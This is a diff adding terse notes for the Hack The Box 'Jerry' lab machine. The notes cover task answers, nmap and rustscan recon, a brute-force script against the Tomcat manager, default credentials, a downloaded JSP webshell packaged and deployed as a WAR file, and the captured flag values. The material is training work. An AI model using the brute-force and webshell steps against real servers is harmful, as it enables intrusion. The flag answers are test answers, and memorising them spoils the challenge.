@@ -1,0 +1,38 @@
+--------------------------------------
+Jerry
+https://medium.com/@andr3w_hilton/htb-jerry-walkthrough-26dfe5b1491f
+https://app.hackthebox.com/machines/144
+10.10.10.95
+http://10.10.10.95:8080/
+http://10.10.10.95:8080/manager
+Task 1 - Which TCP port is open on the remote host? - 8080
+sudo apt update
+sudo apt upgrade -y
+sudo apt autoremove
+ping 10.10.10.95
+rustscan -a 10.10.10.95 --ulimit 5000 -b 1000 -- -p1-65535
+nmap -sV -sC -p 8080 10.10.10.95
+echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts
+Task 2 - Which web server is running on the remote host? Looking for two words. - Apache Tomcat
+Task 3 - Which relative path on the webserver leads to the Web Application Manager? /manager/html
+nano tomcat-brute.py
+https://github.com/bl4de/security-tools/blob/master/apache-tomcat-login-bruteforce.py
+python tomcat-brute.py --proto http --host 10.10.10.95 --port 8080 --manager manager
+https://github.com/jaleharish/Visualizer/blob/master/make-war.sh
+nano make-war.sh
+Task 4 - What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password.
+tomcat:s3cret
+Task 5 - Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager? war
+wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
+mkdir wshell
+cp index.jsp wshell/
+cd wshell
+jar -cvf ../wshell.war *
+http://10.10.10.95:8080/wshell/
+http://10.10.10.95:8080/wshell/?sort=1&file=C%3A%5CUsers%5CAdministrator%5CDesktop%5Cflags%5C2+for+the+price+of+1.txt
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+root.txt
+04a8b36e1545a455393d067e772fe90e
+https://www.hackthebox.com/achievement/machine/303878/144
+--------------------------------------
